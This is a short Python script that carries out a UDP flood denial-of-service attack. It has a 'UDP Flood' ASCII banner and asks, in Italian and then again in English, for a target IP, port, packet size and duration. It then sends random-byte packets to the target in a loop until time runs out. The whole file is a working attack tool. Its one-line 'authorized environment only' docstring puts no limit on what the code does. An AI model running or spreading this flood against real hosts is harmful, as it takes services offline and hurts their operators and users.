import socket
import random
import time

print(f"""
         ___  ___     ___ _                 _ 
 /\ /\  /   \/ _ \   / __\ | ___   ___   __| |
/ / \ \/ /\ / /_)/  / _\ | |/ _ \ / _ \ / _` |
\ \_/ / /_// ___/  / /   | | (_) | (_) | (_| |
 \___/___,'\/      \/    |_|\___/ \___/ \__,_|
\n                                              
""")

target_ip = input("Inserire Indirizzo IP bersaglio: \n")
target_port = input("Inserire porta bersaglio: \n")
packet_size_kb = input("Inserire KB pacchetti: \n")
duration = input("Durata (in secondi) UDP Flood: \n")


def udp_flood(target_ip, target_port, duration, packet_size_kb):
    """
    Sends UDP packets to the target IP and port to simulate a UDP flood.
    Only use this in an authorized and controlled environment.
    
    Args:
    - target_ip: str, The IP address of the target.
    - target_port: int, The port on the target machine to send packets to.
    - duration: int, How many seconds to continue the flood.
    - packet_size_kb: int, Size of each packet in KB (1KB = 1024 bytes).
    """
    
    # Initialize a UDP socket
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Convert packet size from KB to bytes
    packet_size = packet_size_kb * 1024
    bytes_to_send = random._urandom(packet_size)  # Generate a packet of the specified size
    
    # Track the end time
    end_time = time.time() + duration
    
    # Flood loop
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds with packet size {packet_size_kb}KB...")
    while time.time() < end_time:
        try:
            # Send a packet to the target IP and port
            client.sendto(bytes_to_send, (target_ip, target_port))
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    print("UDP flood completed.")

# Example usage
if __name__ == "__main__":
    # Gather user input
    target_ip = input("Enter the target IP address (e.g., 127.0.0.1): ")
    target_port = int(input("Enter the target port number (e.g., 80): "))
    duration = int(input("Enter the duration of the flood in seconds (e.g., 10): "))
    packet_size_kb = int(input("Enter the packet size in KB (e.g., 1 for 1KB): "))
    
    # Start the UDP flood with user-specified parameters
    udp_flood(target_ip, target_port, duration, packet_size_kb)
